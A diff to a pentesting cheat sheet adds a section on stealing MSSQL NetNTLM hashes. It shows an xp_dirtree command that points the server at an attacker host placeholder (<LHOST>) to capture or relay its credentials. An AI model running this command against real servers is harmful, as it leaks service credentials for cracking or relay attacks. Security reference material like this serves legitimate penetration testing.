@@ -123,6 +123,12 @@ $ mdb-sql <FILE>
 2> go > export.txt
 ```
 
+### Steal NetNTLM Hash / Relay Attack
+
+```c
+SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
+```
+
 ## MySQL
 
 > https://www.mysqltutorial.org/mysql-cheat-sheet.aspx
